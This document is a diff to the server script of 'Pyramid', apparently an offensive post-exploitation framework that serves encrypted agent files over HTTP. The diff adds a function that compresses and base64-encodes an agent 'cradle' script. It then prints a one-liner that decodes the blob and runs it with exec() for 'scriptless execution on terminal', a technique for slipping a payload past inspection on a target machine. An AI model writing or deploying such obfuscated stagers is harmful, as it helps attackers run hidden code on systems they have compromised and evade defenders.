@@ -1,6 +1,7 @@
 import http.server
 import argparse
 import sys
+import zlib
 import cgi
 import base64
 import json
@@ -65,8 +66,21 @@ def substitute_parameters(pyramid_params):
 		if filename.endswith(".py"):
 			replace_in_file(pyramid_params, filename, agent_dir)
 	
-
+def print_encoded_cradle():
 	
+	cradle = os.path.dirname(os.getcwd()) + '/Agent/cradle.py'
+	string = "import base64\nimport zlib\nencoded_script=\""
+	print(Fore.YELLOW + "[+] printing b64encoded(zipped(cradle.py)) for scriptless execution on terminal:" + Style.RESET_ALL)
+	try:
+		with open(cradle, 'rb') as f:
+			string += base64.b64encode(zlib.compress(f.read(), level=9)).decode()
+		string += "\"\ndecoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()\nexec(decoded_script)"
+		print(string)
+	except FileNotFoundError:
+		print(Fore.RED + "[-] File not found: " + cradle + Style.RESET_ALL)
+		
+	except Exception as e:
+		print(Fore.RED + "[-] An error occurred: " + str(e) + Style.RESET_ALL)
 				
 				
 	
@@ -281,7 +295,7 @@ if __name__ == '__main__':
 	parser.add_argument('-sslkey', help=f'SSL key file full path (default: {default_sslkey})', default=default_sslkey)
 	parser.add_argument('-sslcert', help=f'SSL certificate file full path (default: {default_sslcert})', default=default_sslcert)
 	parser.add_argument('-filesfolder', help=f'Pyramid Server folder (default: {default_filesfolder})', default=default_filesfolder)
-	parser.add_argument('-enc', choices=['xor', 'chacha20'], help='Apply encryption to delivered files and decrypt URLs. XOR and modified chacha schemes are available', required=True)
+	parser.add_argument('-enc', choices=['xor', 'chacha20'], help='Required option - Apply encryption to delivered files and decrypt URLs. XOR and modified chacha schemes are available', required=True)
 	parser.add_argument('-generate', action='store_true', help='Generate Pyramid Server configs for modules automatically based on command line given')
 	group = parser.add_mutually_exclusive_group(required='-enc' in sys.argv)
 	group.add_argument('-passenc', help='Encryption password')
@@ -378,7 +392,8 @@ __________                              .__    .___
 	if options.generate:
 		print(Fore.YELLOW + "[+] Auto-generating Pyramid config for modules and agents" + Style.RESET_ALL)
 		substitute_parameters(pyramid_params)
-	
+		print_encoded_cradle()
+	    
 	print(Fore.YELLOW + "[+] Pyramid HTTP Server listening on port "+ Style.RESET_ALL,options.port)
 	print(Fore.YELLOW + "[+] MIND YOUR OPSEC! Serving Pyramid files from folder "+ Style.RESET_ALL,options.filesfolder)
 	print(Fore.YELLOW + "[+] User allowed to fetch files: "+ Style.RESET_ALL, options.user)
